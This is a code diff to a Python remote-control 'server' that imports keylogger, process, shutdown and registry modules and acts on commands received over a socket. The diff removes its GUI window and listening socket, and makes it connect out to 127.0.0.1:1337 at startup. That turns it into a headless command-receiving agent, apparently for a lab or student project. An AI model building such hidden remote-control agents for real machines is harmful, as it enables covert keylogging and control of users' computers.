@@ -1,4 +1,4 @@
-import tkinter as tk
+# import tkinter as tk
 import socket
 import keylogger_server as kl 
 import app_process_server as ap
@@ -8,10 +8,10 @@ import mac_address_server as mac
 import shutdown_logout_server as sl
 import registry_server as rs
 
-main = tk.Tk()
-main.geometry("200x200")
-main.title("Server")
-main['bg'] = 'plum1'
+# main = tk.Tk()
+# main.geometry("200x200")
+# main.title("Server")
+# main['bg'] = 'plum1'
 
 #Global variables
 global client
@@ -56,16 +56,21 @@ def registry():
 #Connect
 ###############################################################################           
 def Connect():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    host = ''
-    port = 5656
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.bind((host, port))
-    s.listen(100)
+    # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # host = ''
+    # port = 5656
+    # s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    # s.bind((host, port))
+    # s.listen(100)
     global client
-    client, addr = s.accept()
+    # client, addr = s.accept()
+    # while True:
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.connect(("127.0.0.1", 1337))
+    print("[?] Client connected!")
     while True:
         msg = client.recv(BUFSIZ).decode("utf8")
+        print("[*] Recv: ", msg)
         if "KEYLOG" in msg:
             keylogger()
         elif "SD_LO" in msg:
@@ -86,8 +91,10 @@ def Connect():
             return
 ###############################################################################    
 
-tk.Button(main, text = "OPEN", width = 10, height = 2, fg = 'white', bg = 'IndianRed3', borderwidth=0,
-            highlightthickness=0, command = Connect, relief="flat").place(x = 100, y = 100, anchor = "center")
-main.mainloop()
+# tk.Button(main, text = "OPEN", width = 10, height = 2, fg = 'white', bg = 'IndianRed3', borderwidth=0,
+#             highlightthickness=0, command = Connect, relief="flat").place(x = 100, y = 100, anchor = "center")
+# main.mainloop()
+
+Connect()
 
 
